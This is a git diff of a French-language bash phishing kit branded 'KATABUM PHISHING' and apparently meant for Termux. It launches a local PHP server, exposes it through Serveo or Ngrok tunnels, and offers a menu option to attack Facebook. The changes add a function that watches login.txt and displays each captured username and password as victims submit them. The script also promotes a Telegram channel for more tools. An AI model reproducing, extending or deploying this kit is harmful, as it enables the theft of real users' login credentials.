@@ -1,14 +1,48 @@
+#!/bin/bash
+
 # Couleurs
 BLEU='\033[1;34m'
 JAUNE='\033[1;33m'
 ROUGE='\033[1;31m'
+VERT='\033[1;32m'
 NC='\033[0m' # Pas de couleur
+
+# Fonction pour surveiller et afficher les données PHP
+surveiller_donnees() {
+    echo -e "${VERT}[•] Surveillance des données PHP...${NC}"
+    echo -e "${VERT}Appuyez sur Ctrl+C pour arrêter la surveillance${NC}"
+    
+    # Vérifier si le fichier login.txt existe
+    if [ ! -f login.txt ]; then
+        touch login.txt
+    fi
+    
+    # Afficher le contenu initial
+    if [ -s login.txt ]; then
+        echo -e "${JAUNE}Données actuelles :${NC}"
+        cat login.txt
+    else
+        echo -e "${JAUNE}Aucune donnée pour le moment. En attente...${NC}"
+    fi
+    
+    # Surveiller les modifications du fichier
+    tail -f login.txt | while read -r ligne; do
+        if [[ "$ligne" == *"Username:"* ]]; then
+            echo -e "${VERT}\n[✓] Nouvelle connexion détectée :${NC}"
+            echo -e "${BLEU}$ligne${NC}"
+            read -r ligne # Lire le mot de passe
+            echo -e "${BLEU}$ligne${NC}"
+            echo -e "${JAUNE}En attente des autres utilisateurs...${NC}"
+        fi
+    done
+}
 
 # Fonction pour démarrer le serveur PHP
 demarrer_serveur_php() {
     echo -e "${BLEU}[•] Démarrage du serveur PHP...${NC}"
     php -S localhost:3000 > /dev/null 2>&1 & # Lancer le serveur en arrière-plan
     sleep 2 # Attendre que le serveur démarre
+    surveiller_donnees & # Démarrer la surveillance en arrière-plan
 }
 
 # Fonction pour télécharger et installer Ngrok
@@ -29,12 +63,9 @@ installer_ngrok() {
     # Extraire et déplacer Ngrok
     if unzip ngrok.zip; then
         mkdir -p ~/bin/ # Créer un répertoire local pour les binaires
-        mv ngrok ~/bin/ || {
-            echo -e "${ROUGE}[!] Impossible de déplacer Ngrok vers ~/bin/.${NC}"
-            exit 1
-        }
+        mv ngrok ~/bin/ || { echo -e "${ROUGE}[!] Impossible de déplacer Ngrok vers ~/bin/"; exit 1; }
+        echo -e "${BLEU}[✓] Ngrok installé dans ~/bin/${NC}"
         rm ngrok.zip
-        echo -e "${BLEU}[✓] Ngrok installé avec succès.${NC}"
         export PATH=$PATH:~/bin/ # Ajouter ~/bin au PATH
     else
         echo -e "${ROUGE}[!] Échec de l'extraction de Ngrok. Vérifiez le fichier téléchargé.${NC}"
@@ -89,21 +120,23 @@ fi
 
 # Menu principal
 clear
-echo -e "${BLEU}"
+echo -e "\033[1;36m"  # Cyan brillant
 echo -e "=========================================="
-echo -e "      ██╗  ██╗███████╗██╗  ██╗████████╗  "
-echo -e "      ██║  ██║██╔════╝██║  ██║╚══██╔══╝  "
-echo -e "      ███████║█████╗  ███████║   ██║      "
-echo -e "      ██╔══██║██╔══╝  ██╔══██║   ██║      "
-echo -e "      ██║  ██║███████╗██║  ██║   ██║      "
-echo -e "      ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝      "
+echo -e "   ██╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗"
+echo -e "   ██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║"
+echo -e "   ███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║"
+echo -e "   ██╔══██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██║     ██╔══██║"
+echo -e "   ██║  ██║███████╗██╔╝ ██╗   ██║   ███████╗╚██████╗██║  ██║"
+echo -e "   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝"
 echo -e "=========================================="
-echo -e "          🦠 ⚕️ ＨＥＸ✦ＴＥＣＨ⚕️  🦠            "
+echo -e "\033[0m"
+echo -e "=========================================="
+echo -e "          KATABUM PHISHING         "
 echo -e "=========================================="
 echo -e "${NC}"
 
-echo -e "${JAUNE}1. Attaque Facebook${NC}"
-echo -e "${JAUNE}2. Rejoindre notre canal Telegram${NC}"
+echo -e "${JAUNE}1. Passer à l'attaque${NC}"
+echo -e "${JAUNE}2. Rejoindre notre canal Telegram pour plus d'outils${NC}"
 
 # Lecture du choix utilisateur
 read -p "Choisissez une option (1 ou 2) : " choix
@@ -119,22 +152,15 @@ if [ "$choix" == "1" ]; then
     demarrer_serveur_php
 
     case "$methode" in
-        1)
-            generer_lien_serveo
-            ;;
-        2)
-            generer_lien_ngrok
-            ;;
-        3)
-            generer_lien_autre
-            ;;
-        *)
-            echo -e "${ROUGE}Option invalide. Retour au menu principal...${NC}"
-            ;;
+        1) generer_lien_serveo ;;
+        2) generer_lien_ngrok ;;
+        3) generer_lien_autre ;;
+        *) echo -e "${ROUGE}Option invalide. Retour au menu principal...${NC}" ;;
     esac
+
 elif [ "$choix" == "2" ]; then
     echo -e "${BLEU}Ouverture de notre canal Telegram...${NC}"
-    termux-open-url "https://t.me/+IcftRA7eTCNiOGFk"
+    termux-open-url "https://t.me/hextechcar"
 else
     echo -e "${ROUGE}Option invalide. Quitter...${NC}"
 fi
